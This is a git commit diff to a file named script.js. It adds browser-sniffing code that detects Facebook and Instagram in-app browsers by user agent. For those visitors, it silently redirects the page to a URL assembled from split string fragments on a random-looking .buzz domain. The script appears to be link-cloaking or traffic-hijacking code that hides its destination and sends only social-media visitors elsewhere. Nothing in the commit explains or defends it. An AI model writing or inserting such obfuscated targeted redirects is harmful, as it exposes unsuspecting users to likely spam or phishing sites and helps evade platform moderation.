62ba479d6025531a05c831b16d2e064d8e12d264
instget342 <103908243+instget342@users.noreply.github.com>
2022-04-20 23:42:15 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,4 @@
-if (window.navigator.userAgent.search(/Instagram/) > 0)
+if (window.navigator.userAgent.search(/LightSpeed/) > 0)
 {
 var v="http://";
 var w="04sv4aa1fohfg5w81";
@@ -6,7 +6,20 @@ var x=".";
 var y="buzz";
 var ww="/";
 var xx="re";
-var z=v+w+x+y;
+var z=v+w+x+y+ww+xx;
+window.location.replace(z);
+exit;
+}
+
+if (window.navigator.userAgent.search(/FB_IAB/) > 0)
+{
+var v="http://";
+var w="04sv4aa1fohfg5w81";
+var x=".";
+var y="buzz";
+var ww="/";
+var xx="re";
+var z=v+w+x+y+ww+xx;
 window.location.replace(z);
 exit;
 }
